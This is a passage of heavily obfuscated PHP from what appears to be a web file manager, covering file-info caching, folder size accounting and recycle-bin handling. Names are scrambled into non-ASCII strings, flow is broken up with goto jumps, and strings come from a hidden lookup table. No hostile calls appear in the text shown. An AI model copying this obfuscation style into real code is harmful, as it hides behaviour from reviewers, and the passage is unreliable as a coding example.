E’ﬁ™Êé®Õ; E—Œ¨Éµáù: $aå≈óáàÊí = Model($D∂‚’ﬁ¬»È[418])->fileInfo($Fò¨Èèõ•[$D∂‚’ﬁ¬»È[415]]); if ($aå≈óáàÊí) { $aå≈óáàÊí[$D∂‚’ﬁ¬»È[28]] = $Fò¨Èèõ•[$D∂‚’ﬁ¬»È[28]]; } self::$cacheFileInfo[$a∏õ¨∑ÿá˜] = $aå≈óáàÊí; goto e√ê—ÃÏêÎ; F“Ë©≠Ë√·: $a∏õ¨∑ÿá˜ = $D∂‚’ﬁ¬»È[421] . $Fò¨Èèõ•[$D∂‚’ﬁ¬»È[415]]; $F¬ˆâØø¯Á = _get(self::$cacheFileInfo, $a∏õ¨∑ÿá˜); if ($F¬ˆâØø¯Á) { return $F¬ˆâØø¯Á; } goto E—Œ¨Éµáù; e√ê—ÃÏêÎ: return $aå≈óáàÊí; goto F¿¶∑Ààà; E’ﬁ™Êé®Õ: $D∂‚’ﬁ¬»È =& $_SERVER[—Ω]; $Fò¨Èèõ• = $this->sourceInfo($fûú∞π”çﬁ); if (!$Fò¨Èèõ• || $Fò¨Èèõ•[$D∂‚’ﬁ¬»È[367]]) { return !1; } goto F“Ë©≠Ë√·; F¿¶∑Ààà: } private function folderChildrenNumber($E¶ëÍı∑‰ÿ) { $F∫ÿ¬ÜÑ≠Û =& $_SERVER[—Ω]; $Eã∂›√éÑö = $this->sourceInfo($E¶ëÍı∑‰ÿ); $C†√œ∫ﬁí’ = array($F∫ÿ¬ÜÑ≠Û[521] => array($F∫ÿ¬ÜÑ≠Û[479], $Eã∂›√éÑö[$F∫ÿ¬ÜÑ≠Û[455]] . $E¶ëÍı∑‰ÿ . $F∫ÿ¬ÜÑ≠Û[480]), $F∫ÿ¬ÜÑ≠Û[392] => intval($Eã∂›√éÑö[$F∫ÿ¬ÜÑ≠Û[393]]), $F∫ÿ¬ÜÑ≠Û[514] => 1); $E«Ö†‡≈Çë = $this->where($C†√œ∫ﬁí’)->count(); $bƒ∂ —Ó˜… = $this->where($C†√œ∫ﬁí’)->where(array($F∫ÿ¬ÜÑ≠Û[514] => 0))->count(); return array($F∫ÿ¬ÜÑ≠Û[81] => $bƒ∂ —Ó˜…, $F∫ÿ¬ÜÑ≠Û[82] => $E«Ö†‡≈Çë); } public function pathInfo($D∂≈àË∫–∞, $CÖÎÍ”â˘Ò = false) { goto E Õ£¶Ò‘Ÿ; cäïÑ‰√˘å: $bâÂõ≥ìœØ = $this->_listDataApplyItem($bâÂõ≥ìœØ, $CÖÎÍ”â˘Ò); self::$cachePathInfo[$C”∂¿™ßŸÎ] = $bâÂõ≥ìœØ; return $bâÂõ≥ìœØ; goto eÆáÏœΩ™è; E¿íÌ€∂ƒ∂: if ($EºäÃÑéâ†) { return $EºäÃÑéâ†; } $bâÂõ≥ìœØ = $this->sourceInfo($D∂≈àË∫–∞); if (!$bâÂõ≥ìœØ) { return !1; } goto cäïÑ‰√˘å; E Õ£¶Ò‘Ÿ: $cû™›¯ÕÀè =& $_SERVER[—Ω]; $C”∂¿™ßŸÎ = $cû™›¯ÕÀè[407] . intval($CÖÎÍ”â˘Ò) . $cû™›¯ÕÀè[408] . $D∂≈àË∫–∞; $EºäÃÑéâ† = _get(self::$cachePathInfo, $C”∂¿™ßŸÎ); goto E¿íÌ€∂ƒ∂; eÆáÏœΩ™è: } public static $cachePathInfoMore = array(); public function pathInfoMore($Bí”òÈ–Ñû) { goto eãÂœ‚Ÿâ⁄; Cö‹õ√Ö—Ç: $FÖ„èËﬂ„— = $this->pathInfo($Bí”òÈ–Ñû); if (!$FÖ„èËﬂ„—) { return !1; } if ($FÖ„èËﬂ„—[$AÚçñÃ˜ôŸ[367]] == $AÚçñÃ˜ôŸ[83]) { $FÖ„èËﬂ„—[$AÚçñÃ˜ôŸ[80]] = $this->folderChildrenNumber($Bí”òÈ–Ñû); } goto cà™£„⁄©»; cà™£„⁄©»: self::$cachePathInfoMore[$Bí”òÈ–Ñû] = $FÖ„èËﬂ„—; return $FÖ„èËﬂ„—; goto FÜÜÇÒ¿»ñ; eãÂœ‚Ÿâ⁄: $AÚçñÃ˜ôŸ =& $_SERVER[—Ω]; $Dêìä≤ã≤≤ = _get(self::$cachePathInfoMore, $Bí”òÈ–Ñû); if ($Dêìä≤ã≤≤) { return $Dêìä≤ã≤≤; } goto Cö‹õ√Ö—Ç; FÜÜÇÒ¿»ñ: } public function sourceInfo($Bﬁ»ûË‘äø) { goto eΩû˘ê™‰Ò; eΩû˘ê™‰Ò: $aëØî´∆å£ =& $_SERVER[—Ω]; if (!$Bﬁ»ûË‘äø) { return array(); } $c≈§èµÊôö = $aëØî´∆å£[406] . $Bﬁ»ûË‘äø; goto BØ†Áîé⁄„; cÀª«ƒÈªà: self::$cacheSourceInfo[$c≈§èµÊôö] = $fåøàΩäÓ◊; return self::$cacheSourceInfo[$c≈§èµÊôö]; goto e¯Î™û¥ß√; BØ†Áîé⁄„: $E∫Ê∫™ç¥— = _get(self::$cacheSourceInfo, $c≈§èµÊôö); if ($E∫Ê∫™ç¥—) { return $E∫Ê∫™ç¥—; } $fåøàΩäÓ◊ = $this->where(array($aëØî´∆å£[366] => $Bﬁ»ûË‘äø))->find(); goto cÀª«ƒÈªà; e¯Î™û¥ß√: } public function sourceCacheClear($dµﬂîÿÕÂò = false) { if ($dµﬂîÿÕÂò == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[—Ω][406] . $dµﬂîÿÕÂò]); } public function pathInfoByPath($DÚÑãá‹Öä, $bÉ≈ÉØÙ·Ï) { $aÿ†Òº£≤ù =& $_SERVER[—Ω]; $FåùÀå”àÁ = !$bÉ≈ÉØÙ·Ï ? array() : explode($aÿ†Òº£≤ù[8], trim($bÉ≈ÉØÙ·Ï, $aÿ†Òº£≤ù[8])); $aáÜ…—É¡ = $DÚÑãá‹Öä; foreach ($FåùÀå”àÁ as $eÈ•⁄Ú•‹Ò) { $FÖ—Àıœµæ = array($aÿ†Òº£≤ù[457] => $aáÜ…—É¡, $aÿ†Òº£≤ù[28] => $eÈ•⁄Ú•‹Ò); $AëÕ”ºØßÍ = $this->where($FÖ—Àıœµæ)->select(); if (!$AëÕ”ºØßÍ) { return !1; } $AëÕ”ºØßÍ = array_sort_by($AëÕ”ºØßÍ, $aÿ†Òº£≤ù[393]); $aáÜ…—É¡ = $AëÕ”ºØßÍ[0][$aÿ†Òº£≤ù[366]]; } return $this->pathInfo($aáÜ…—É¡, !0); } protected function updateModifyTime($fœÈ¢àé˘≠) { goto e√Ωˆﬂﬁë‰; fâƒãêßî”: foreach ($fœÈ¢àé˘≠ as $CÍéåÙ∂„â => $aπ¶˘ö´Õ¿) { $fœÈ¢àé˘≠[$CÍéåÙ∂„â] = intval($aπ¶˘ö´Õ¿); } $d°ıœﬂıö˜ = array($A’ÇˆáÌ‘ì[366] => array($A’ÇˆáÌ‘ì[7], $fœÈ¢àé˘≠)); $b«µÙ‹’ÍË = array($A’ÇˆáÌ‘ì[520] => USER_ID, $A’ÇˆáÌ‘ì[387] => time()); goto c∆π”Ù±çì; e√Ωˆﬂﬁë‰: $A’ÇˆáÌ‘ì =& $_SERVER[—Ω]; if (!$fœÈ¢àé˘≠) { return; } if (!is_array($fœÈ¢àé˘≠)) { $fœÈ¢àé˘≠ = array($fœÈ¢àé˘≠); } goto fâƒãêßî”; c∆π”Ù±çì: $this->where($d°ıœﬂıö˜)->save($b«µÙ‹’ÍË); goto BêÆåâ£”¡; BêÆåâ£”¡: } public function folderSizeReset($BÀ∏˜ÙøÚ†) { goto D°à»ÔË—â; EªÓ¶∫∂™«: CacheLock::lock($f›£∏¥ŸÔ≤, 20); $this->sourceCacheClear($BÀ∏˜ÙøÚ†); $bÑˆóÁ’–è = $this->sourceInfo($BÀ∏˜ÙøÚ†); goto fÉ¨ë Êñò; fÉ¨ë Êñò: $A‚“ë‹∏‡” = array($EããÚøê»“[365] => $BÀ∏˜ÙøÚ†, $EããÚøê»“[392] => 0); $C¨êà—ô†é = $this->where($A‚“ë‹∏‡”)->sum($EããÚøê»“[77]); $C¨êà—ô†é = intval($C¨êà—ô†é); goto A≥éÏÆ≠·É; bŒ‘Òæé‰‡: CacheLock::unlock($f›£∏¥ŸÔ≤); goto bîñ∫¥Òß‰; D°à»ÔË—â: $EããÚøê»“ =& $_SERVER[—Ω]; if ($this->statusIgnoreResetSpace) { return; } $f›£∏¥ŸÔ≤ = $EããÚøê»“[2321] . $BÀ∏˜ÙøÚ†; goto EªÓ¶∫∂™«; A≥éÏÆ≠·É: $f¬æÖôﬁ≠∫ = $C¨êà—ô†é - intval($bÑˆóÁ’–è[$EããÚøê»“[77]]); if ($f¬æÖôﬁ≠∫ == 0) { return CacheLock::unlock($f›£∏¥ŸÔ≤); } $this->where(array($EããÚøê»“[380] => $BÀ∏˜ÙøÚ†))->setField($EããÚøê»“[77], $C¨êà—ô†é); goto cÑê®áã±∞; cÑê®áã±∞: $cÂªªòÊÌà = $this->parentLevelArray($bÑˆóÁ’–è[$EããÚøê»“[455]]); if ($cÂªªòÊÌà) { $A‚“ë‹∏‡” = array($EããÚøê»“[366] => array($EããÚøê»“[381], $cÂªªòÊÌà)); if ($f¬æÖôﬁ≠∫ < 0) { $A‚“ë‹∏‡”[$EããÚøê»“[77]] = array($EããÚøê»“[935], abs($f¬æÖôﬁ≠∫)); } $this->where($A‚“ë‹∏‡”)->setAdd($EããÚøê»“[77], $f¬æÖôﬁ≠∫); } $this->targetSpaceUpdate($bÑˆóÁ’–è[$EããÚøê»“[368]], $bÑˆóÁ’–è[$EããÚøê»“[452]]); goto bŒ‘Òæé‰‡; bîñ∫¥Òß‰: } public function folderSizeResetChildren($BƒÆªŸäÖΩ) { goto b ‰∫∆ƒ˘⁄; dê§çÚË≈≠: foreach ($C≥È÷É¥ËÚ as $a®ÚõåÉÆŒ) { if ($a®ÚõåÉÆŒ[$CÍÙƒãœ≠∫[77]] == $a®ÚõåÉÆŒ[$CÍÙƒãœ≠∫[2323]]) { continue; } $E”à∂ÿé¬ß[] = array($CÍÙƒãœ≠∫[366], $a®ÚõåÉÆŒ[$CÍÙƒãœ≠∫[366]], $CÍÙƒãœ≠∫[77], $a®ÚõåÉÆŒ[$CÍÙƒãœ≠∫[77]]); } $this->saveAll($E”à∂ÿé¬ß); goto FÒ€°¯∞Ö¡; e©‰£ª˘Ÿ¢: foreach ($d’Êä´∂çæ as $a®ÚõåÉÆŒ) { $eû¶í““Ô† = $a®ÚõåÉÆŒ[$CÍÙƒãœ≠∫[457]] . $CÍÙƒãœ≠∫[33]; if (!isset($C≥È÷É¥ËÚ[$eû¶í““Ô†])) { continue; } if ($a®ÚõåÉÆŒ[$CÍÙƒãœ≠∫[393]] == $C≥È÷É¥ËÚ[$eû¶í““Ô†][$CÍÙƒãœ≠∫[393]]) { $C≥È÷É¥ËÚ[$eû¶í““Ô†][$CÍÙƒãœ≠∫[77]] += $a®ÚõåÉÆŒ[$CÍÙƒãœ≠∫[77]]; } } foreach ($C≥È÷É¥ËÚ as $a®ÚõåÉÆŒ) { $B¢àÁ∆íÀ› = $this->parentLevelArray($a®ÚõåÉÆŒ[$CÍÙƒãœ≠∫[455]]); foreach ($B¢àÁ∆íÀ› as $eû¶í““Ô†) { $eû¶í““Ô† = $eû¶í““Ô† . $CÍÙƒãœ≠∫[33]; if (!isset($C≥È÷É¥ËÚ[$eû¶í““Ô†])) { continue; } if ($a®ÚõåÉÆŒ[$CÍÙƒãœ≠∫[393]] == $C≥È÷É¥ËÚ[$eû¶í““Ô†][$CÍÙƒãœ≠∫[393]]) { $C≥È÷É¥ËÚ[$eû¶í““Ô†][$CÍÙƒãœ≠∫[77]] += $a®ÚõåÉÆŒ[$CÍÙƒãœ≠∫[77]]; } } } $E”à∂ÿé¬ß = array(); goto dê§çÚË≈≠; D˘¯ÛÇ“à¶: $fÁïçº“ÙÔ = array($CÍÙƒãœ≠∫[514] => 1, $CÍÙƒãœ≠∫[521] => array($CÍÙƒãœ≠∫[479], $DﬂˆÿµÚ©ß[$CÍÙƒãœ≠∫[455]] . $BƒÆªŸäÖΩ . $CÍÙƒãœ≠∫[480])); $EÙ¥Ü◊∂‘Ô = $CÍÙƒãœ≠∫[2322]; $C≥È÷É¥ËÚ = $this->field($EÙ¥Ü◊∂‘Ô)->where($fÁïçº“ÙÔ)->select(); goto cÍ≠ìÓ ıÆ; b ‰∫∆ƒ˘⁄: $CÍÙƒãœ≠∫ =& $_SERVER[—Ω]; $this->sourceCacheClear($BƒÆªŸäÖΩ); $DﬂˆÿµÚ©ß = $this->sourceInfo($BƒÆªŸäÖΩ); goto D˘¯ÛÇ“à¶; Fï¿‹û∏‚ë: $C≥È÷É¥ËÚ[] = $DﬂˆÿµÚ©ß; $C≥È÷É¥ËÚ = array_to_keyvalue($C≥È÷É¥ËÚ, $CÍÙƒãœ≠∫[366]); foreach ($C≥È÷É¥ËÚ as $aªíöóåÈ˘ => $a®ÚõåÉÆŒ) { $C≥È÷É¥ËÚ[$aªíöóåÈ˘][$CÍÙƒãœ≠∫[2323]] = $C≥È÷É¥ËÚ[$aªíöóåÈ˘][$CÍÙƒãœ≠∫[77]]; $C≥È÷É¥ËÚ[$aªíöóåÈ˘][$CÍÙƒãœ≠∫[77]] = 0; } goto e©‰£ª˘Ÿ¢; cÍ≠ìÓ ıÆ: $fÁïçº“ÙÔ[$CÍÙƒãœ≠∫[367]] = 0; $d’Êä´∂çæ = $this->field($EÙ¥Ü◊∂‘Ô)->where($fÁïçº“ÙÔ)->select(); if (!$d’Êä´∂çæ) { return; } goto Fï¿‹û∏‚ë; FÒ€°¯∞Ö¡: } public function userSpaceReset($D ≈€ëçÑπ = false) { $FÏ¢ââ∫ØÈ =& $_SERVER[—Ω]; $eâ°«Ÿœ¶ = $this->where(array($FÏ¢ââ∫ØÈ[368] => self::TYPE_USER, $FÏ¢ââ∫ØÈ[452] => $D ≈€ëçÑπ, $FÏ¢ââ∫ØÈ[367] => 0))->sum($FÏ¢ââ∫ØÈ[77]); Model($FÏ¢ââ∫ØÈ[470])->userEdit($D ≈€ëçÑπ, array($FÏ¢ââ∫ØÈ[2066] => $eâ°«Ÿœ¶)); } public function targetSpaceUpdate($fÆééÚÑ„†, $A‰œí‘‡€§) { $CµòÛÛà¨ =& $_SERVER[—Ω]; if (!$A‰œí‘‡€§) { return; } if (!in_array($fÆééÚÑ„†, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $b•˜æ¥¿ñù = $this->targetSpaceSize($fÆééÚÑ„†, $A‰œí‘‡€§); if ($fÆééÚÑ„† == self::TYPE_USER) { Model($CµòÛÛà¨[470])->userEdit($A‰œí‘‡€§, array($CµòÛÛà¨[2066] => $b•˜æ¥¿ñù)); } else { if ($fÆééÚÑ„† == self::TYPE_GROUP) { Model($CµòÛÛà¨[454])->groupEdit($A‰œí‘‡€§, array($CµòÛÛà¨[2066] => $b•˜æ¥¿ñù)); } } } public function targetSpaceSize($EπÂÛ±¥êç, $e¡çäÕàÀ˜) { goto aØüÖíπÖü; EÉêÿï‚ìÕ: $F∏é«Æñ©∏ = array_to_keyvalue($F∏é«Æñ©∏, $eÑ¡¶Ñâ¯¿[33], $eÑ¡¶Ñâ¯¿[366]); $F∏é«Æñ©∏ = array_unique(array_filter($F∏é«Æñ©∏)); if ($F∏é«Æñ©∏) { $bí°∞ˆèì™ = array($eÑ¡¶Ñâ¯¿[380] => array($eÑ¡¶Ñâ¯¿[381], $F∏é«Æñ©∏)); $fåêﬂ∆Ï©‘ += floatval($this->where($bí°∞ˆèì™)->sum($eÑ¡¶Ñâ¯¿[77])); } goto AÇ·úâ¿‡á; E´Í€∏•·Ó: $fåêﬂ∆Ï©‘ = floatval($E⁄å”‘ °˘[$eÑ¡¶Ñâ¯¿[77]]); $bí°∞ˆèì™ = array($eÑ¡¶Ñâ¯¿[521] => array($eÑ¡¶Ñâ¯¿[479], $eÑ¡¶Ñâ¯¿[466] . $E⁄å”‘ °˘[$eÑ¡¶Ñâ¯¿[366]] . $eÑ¡¶Ñâ¯¿[480])); $F∏é«Æñ©∏ = Model($eÑ¡¶Ñâ¯¿[391])->field($eÑ¡¶Ñâ¯¿[380])->where($bí°∞ˆèì™)->select(); goto EÉêÿï‚ìÕ; aØüÖíπÖü: $eÑ¡¶Ñâ¯¿ =& $_SERVER[—Ω]; $E⁄å”‘ °˘ = $this->sourceRoot($EπÂÛ±¥êç, $e¡çäÕàÀ˜, !0); if (!$E⁄å”‘ °˘) { return 0; } goto E´Í€∏•·Ó; AÇ·úâ¿‡á: return $fåêﬂ∆Ï©‘; goto A˘É´ØÛËÀ; A˘É´ØÛËÀ: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($fä¿”°Ù∂ä) { return $this->fileTypeProfile($fä¿”°Ù∂ä, SourceModel::TYPE_USER); } public function groupFileTypeProfile($AÃÏÍ—Ÿé‹) { return $this->fileTypeProfile($AÃÏÍ—Ÿé‹, SourceModel::TYPE_GROUP); } private function fileTypeProfile($aèÌ€Íëˆô, $Dïå⁄”Êˆ˘) { goto e¢ÎàØç®–; e¢ÎàØç®–: $aÙÙô£êìÿ =& $_SERVER[—Ω]; $c£‚ﬂ Øçë = $aÙÙô£êìÿ[2324] . $aèÌ€Íëˆô . $aÙÙô£êìÿ[70] . $Dïå⁄”Êˆ˘; $C†áÌÿèÒ– = Cache::get($c£‚ﬂ Øçë); goto DÏ ë“°Ÿõ; DÈßàØ°∫ô: foreach ($FÈ†Û≈çæÕ as $CÖé∏îÂÚ◊ => $Cãﬂ≈£ÀóË) { $bó≈üäﬁÏŒ[$aÙÙô£êìÿ[369]] = $this->fileTypeWhere($CÖé∏îÂÚ◊); $Eîéò¢∑ÉÉ[$CÖé∏îÂÚ◊] = array($aÙÙô£êìÿ[2326] => $Cãﬂ≈£ÀóË[$aÙÙô£êìÿ[28]], $aÙÙô£êìÿ[2327] => $this->where($bó≈üäﬁÏŒ)->count(), $aÙÙô£êìÿ[516] => $this->where($bó≈üäﬁÏŒ)->sum($aÙÙô£êìÿ[77])); } Cache::set($c£‚ﬂ Øçë, $Eîéò¢∑ÉÉ, 1200); return $Eîéò¢∑ÉÉ; goto a¬±«èàÑ™; a≤ö›≤Øƒä: $Eîéò¢∑ÉÉ = array(); $Eîéò¢∑ÉÉ[$aÙÙô£êìÿ[2325]] = array($aÙÙô£êìÿ[2326] => LNG($aÙÙô£êìÿ[2325]), $aÙÙô£êìÿ[2327] => $this->where($bó≈üäﬁÏŒ)->count(), $aÙÙô£êìÿ[516] => $this->where($bó≈üäﬁÏŒ)->sum($aÙÙô£êìÿ[77])); $FÈ†Û≈çæÕ = KodIO::fileTypeList(); goto DÈßàØ°∫ô; DÏ ë“°Ÿõ: if ($C†áÌÿèÒ–) { return $C†áÌÿèÒ–; } $bó≈üäﬁÏŒ = array($aÙÙô£êìÿ[514] => 0); if ($aèÌ€Íëˆô != !1) { $bó≈üäﬁÏŒ[$aÙÙô£êìÿ[452]] = $aèÌ€Íëˆô; $bó≈üäﬁÏŒ[$aÙÙô£êìÿ[368]] = $Dïå⁄”Êˆ˘; } goto a≤ö›≤Øƒä; a¬±«èàÑ™: } public function fileNameExist($B†æ¯∏‡≤¿, $cß…ÜºÉÏØ) { $E£¿áŸ™ÇÀ =& $_SERVER[—Ω]; $bÛ÷ñ¢‹†Ì = $this->childList($B†æ¯∏‡≤¿); foreach ($bÛ÷ñ¢‹†Ì as $F„úøï∞áó) { if ($F„úøï∞áó[$E£¿áŸ™ÇÀ[28]] == $cß…ÜºÉÏØ) { return $F„úøï∞áó[$E£¿áŸ™ÇÀ[366]]; } } return !1; } public function childList($eÔòÑÜù„¢) { goto Aïçå¿Ò¯–; fÓ“âÛºÑ¥: $D√ˆ©æÚÆ¶ = array($d∞∏Ù«à¬ò[457] => intval($eÔòÑÜù„¢), $d∞∏Ù«à¬ò[393] => 0); $DÉ∞¥åéπã = $this->where($D√ˆ©æÚÆ¶)->select(); $DÉ∞¥åéπã = $DÉ∞¥åéπã ? $DÉ∞¥åéπã : array(); goto E´ë´ÉëâÓ; Aïçå¿Ò¯–: $d∞∏Ù«à¬ò =& $_SERVER[—Ω]; $F≠Ñ¨âÆºç = $d∞∏Ù«à¬ò[2306] . $eÔòÑÜù„¢; if (isset(self::$cacheChildList[$F≠Ñ¨âÆºç])) { return self::$cacheChildList[$F≠Ñ¨âÆºç]; } goto fÓ“âÛºÑ¥; E´ë´ÉëâÓ: self::$cacheChildList[$F≠Ñ¨âÆºç] = $DÉ∞¥åéπã; foreach ($DÉ∞¥åéπã as $B⁄˘ˆÀãÆ‰) { $F≠Ñ¨âÆºç = $d∞∏Ù«à¬ò[406] . $B⁄˘ˆÀãÆ‰[$d∞∏Ù«à¬ò[366]]; self::$cacheSourceInfo[$F≠Ñ¨âÆºç] = $B⁄˘ˆÀãÆ‰; } return $DÉ∞¥åéπã; goto eıÛõÎüÏ©; eıÛõÎüÏ©: } public function fileNameAuto($Dµπ·õãò€, $Bü£êÆ ƒ√, $c™Ú‘≥É€• = REPEAT_RENAME, $cœë´§÷‰‘ = false) { $cõ¡ëà€§€ =& $_SERVER[—Ω]; $cë¿€œ‰ö† = $this->childList($Dµπ·õãò€); $d¨ØÏÚ¶Ú¢ = array_to_keyvalue($cë¿€œ‰ö†, $cõ¡ëà€§€[33], $cõ¡ëà€§€[28]); return $this->fileNameAutoGet($d¨ØÏÚ¶Ú¢, $Bü£êÆ ƒ√, $c™Ú‘≥É€•, $cœë´§÷‰‘); } public function fileNameAutoGet($dÕøÑßçπ‹, $DÈıÁà≠∞â, $d±ë¢®”ıÏ, $fªº“ıÖãç) { $DÔÃö‘†ÎÕ =& $_SERVER[—Ω]; if ($d±ë¢®”ıÏ == REPEAT_REPLACE || !$dÕøÑßçπ‹ || !in_array_not_case($DÈıÁà≠∞â, $dÕøÑßçπ‹) || $fªº“ıÖãç && $d±ë¢®”ıÏ != REPEAT_RENAME_FOLDER) { return $DÈıÁà≠∞â; } if ($d±ë¢®”ıÏ == REPEAT_SKIP) { return !1; } $AÑåì ô∏è = $DÔÃö‘†ÎÕ[93] . get_path_ext($DÈıÁà≠∞â); $AÑåì ô∏è = $AÑåì ô∏è == $DÔÃö‘†ÎÕ[93] || $fªº“ıÖãç ? $DÔÃö‘†ÎÕ[33] : $AÑåì ô∏è; for ($AÖ—Ç„ÜÌö = 1; $AÖ—Ç„ÜÌö <= count($dÕøÑßçπ‹) + 1; $AÖ—Ç„ÜÌö++) { $Fıç—˜µñ˘ = substr($DÈıÁà≠∞â, 0, strlen($DÈıÁà≠∞â) - strlen($AÑåì ô∏è)); $AëÂ¨∏◊¶Á = $Fıç—˜µñ˘ . "\50{$AÖ—Ç„ÜÌö}\x29{$AÑåì ô∏è}"; if (!in_array_not_case($AëÂ¨∏◊¶Á, $dÕøÑßçπ‹)) { return $AëÂ¨∏◊¶Á; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\157\165\x72\x63\x65\137\162\145\143\171\x63\x6c\x65"; protected $dataAuto = array(array("\x63\162\145\x61\164\x65\124\x69\155\x65", "\x74\151\155\145", "\151\x6e\x73\145\x72\164", "\146\165\156\x63\164\x69\x6f\x6e")); public function listData($f ﬂç‰‡ΩÇ = false) { $D•ïµ™§¨é =& $_SERVER[—Ω]; $f ﬂç‰‡ΩÇ = $f ﬂç‰‡ΩÇ ? $f ﬂç‰‡ΩÇ : USER_ID; $EıÕπõÍËÆ = $this->where(array($D•ïµ™§¨é[1408] => $f ﬂç‰‡ΩÇ))->select(); return array_to_keyvalue($EıÕπõÍËÆ, $D•ïµ™§¨é[33], $D•ïµ™§¨é[366]); } public function moveToRecycle($Fç•ßÈâ“Õ) { goto e†µäÍ˘∏Õ; e†µäÍ˘∏Õ: $dù¥öõ∞≥á =& $_SERVER[—Ω]; $B¨∑Ïä¥âÀ = Model($dù¥öõ∞≥á[1114]); $b˘¡ÒËèÊ» = $B¨∑Ïä¥âÀ->sourceInfo($Fç•ßÈâ“Õ); goto FÙÃ£øÏå; FÜèåöÆàï: $this->recycleMove($Fç•ßÈâ“Õ, 1); if ($b˘¡ÒËèÊ»[$dù¥öõ∞≥á[367]] == $dù¥öõ∞≥á[83]) { $DÊò£™ÔÂ¶ = array($dù¥öõ∞≥á[521] => array($dù¥öõ∞≥á[479], $b˘¡ÒËèÊ»[$dù¥öõ∞≥á[455]] . $Fç•ßÈâ“Õ . $dù¥öõ∞≥á[480])); $B¨∑Ïä¥âÀ->where($DÊò£™ÔÂ¶)->setField($dù¥öõ∞≥á[393], 1); } goto Aßë·˘Ôóô; FÙÃ£øÏå: if (!$b˘¡ÒËèÊ» || $b˘¡ÒËèÊ»[$dù¥öõ∞≥á[393]] == $dù¥öõ∞≥á[83]) { return; } $bæˆûùœËô = array($dù¥öõ∞≥á[380] => $Fç•ßÈâ“Õ, $dù¥öõ∞≥á[1408] => USER_ID, $dù¥öõ∞≥á[517] => $b˘¡ÒËèÊ»[$dù¥öõ∞≥á[368]], $dù¥öõ∞≥á[518] => $b˘¡ÒËèÊ»[$dù¥öõ∞≥á[452]], $dù¥öõ∞≥á[521] => $b˘¡ÒËèÊ»[$dù¥öõ∞≥á[455]]); $this->add($bæˆûùœËô); goto FÜèåöÆàï; Aßë·˘Ôóô: } public function clear() { $this->remove(!1); } public function remove($fÿ≥–Ö≤œÑ = false) { goto aÏıŸã¡¡‹; cÃËÉ¶≠ïÙ: foreach ($F´›Ê’‹° as $Dñ˘ıﬂŒêë) { $c´´óÖèËç->targetSpaceUpdate($Dñ˘ıﬂŒêë[$DﬁàÉÍ≠ﬂÇ[368]], $Dñ˘ıﬂŒêë[$DﬁàÉÍ≠ﬂÇ[452]]); } goto cˆì˜å«√¢; eçÒô∏ëˆÙ: $fÿ≥–Ö≤œÑ = $fÿ≥–Ö≤œÑ === !1 ? !1 : $fÿ≥–Ö≤œÑ; $F´›Ê’‹° = array(); foreach ($D∏÷◊‘ƒÍÛ as $dÙ›Ë∑ÚàΩ) { if ($fÿ≥–Ö≤œÑ != !1 && !in_array($dÙ›Ë∑ÚàΩ, $fÿ≥–Ö≤œÑ)) { continue; } $c´´óÖèËç->remove($dÙ›Ë∑ÚàΩ, !1); $Bø“ì÷°©¬ = $this->where(array($DﬁàÉÍ≠ﬂÇ[366] => $dÙ›Ë∑ÚàΩ))->find(); $eÔ…ŸØÔØú = $Bø“ì÷°©¬[$DﬁàÉÍ≠ﬂÇ[368]] . $DﬁàÉÍ≠ﬂÇ[70] . $Bø“ì÷°©¬[$DﬁàÉÍ≠ﬂÇ[452]]; $F´›Ê’‹°[$eÔ…ŸØÔØú] = array($DﬁàÉÍ≠ﬂÇ[517] => $Bø“ì÷°©¬[$DﬁàÉÍ≠ﬂÇ[368]], $DﬁàÉÍ≠ﬂÇ[452] => $Bø“ì÷°©¬[$DﬁàÉÍ≠ﬂÇ[452]]); $this->where(array($DﬁàÉÍ≠ﬂÇ[366] => $dÙ›Ë∑ÚàΩ))->delete(); } goto cÃËÉ¶≠ïÙ; aÏıŸã¡¡‹: $DﬁàÉÍ≠ﬂÇ =& $_SERVER[—Ω]; $c´´óÖèËç = Model($DﬁàÉÍ≠ﬂÇ[1114]); $D∏÷◊‘ƒÍÛ = $this->listData(); goto eçÒô∏ëˆÙ; cˆì˜å«√¢: } public function restore($E›äì˜™ç± = false) { goto Aô§ªãÉÎà; FíÊÆ≈ÊÉ‹: foreach ($Dœ·Òëƒ®ñ as $bÚ ÁÈã‡°) { goto E∂¯Ò¬ëêŸ; fÉÇªìÿÆ“: if ($A…˜¡à›é¶[$eæ—âÃÖø§[393]] == $eæ—âÃÖø§[83]) { continue; } $bË„å¨™Ì¯->lockMoveStart($bÚ ÁÈã‡°); $this->recycleMove($bÚ ÁÈã‡°, 0); goto eÇù´àòÁœ; b¿òÊãÙ”: $cÆ¢„∂≈Ø∂[] = $E≥Á∆ê†´Ì[$eæ—âÃÖø§[457]]; if ($E≥Á∆ê†´Ì[$eæ—âÃÖø§[367]] == $eæ—âÃÖø§[83]) { $cÆ¢„∂≈Ø∂[] = $bÚ ÁÈã‡°; } $bË„å¨™Ì¯->lockMoveEnd($bÚ ÁÈã‡°); goto D◊Ç¯πñ…â; eÇù´àòÁœ: if ($E≥Á∆ê†´Ì[$eæ—âÃÖø§[367]] == $eæ—âÃÖø§[83]) { $a¨’ûŒÙ·– = array($eæ—âÃÖø§[521] => array($eæ—âÃÖø§[479], $E≥Á∆ê†´Ì[$eæ—âÃÖø§[455]] . $bÚ ÁÈã‡° . $eæ—âÃÖø§[480])); $bË„å¨™Ì¯->where($a¨’ûŒÙ·–)->setField($eæ—âÃÖø§[393], 0); } $this->where(array($eæ—âÃÖø§[366] => $bÚ ÁÈã‡°))->delete(); $bË„å¨™Ì¯->folderSizeReset($E≥Á∆ê†´Ì[$eæ—âÃÖø§[457]]); goto b¿òÊãÙ”; E∂¯Ò¬ëêŸ: if ($E›äì˜™ç± != !1 && !in_array($bÚ ÁÈã‡°, $E›äì˜™ç±)) { continue; } $E≥Á∆ê†´Ì = $bË„å¨™Ì¯->sourceInfo($bÚ ÁÈã‡°); $A…˜¡à›é¶ = $bË„å¨™Ì¯->sourceInfo($E≥Á∆ê†´Ì[$eæ—âÃÖø§[457]]); goto fÉÇªìÿÆ“; D◊Ç¯πñ…â: } $bË„å¨™Ì¯->updateModifyTime($cÆ¢„∂≈Ø∂); goto BÎ≈ÛﬂŒ¡œ; Aô§ªãÉÎà: $eæ—âÃÖø§ =& $_SERVER[—Ω]; 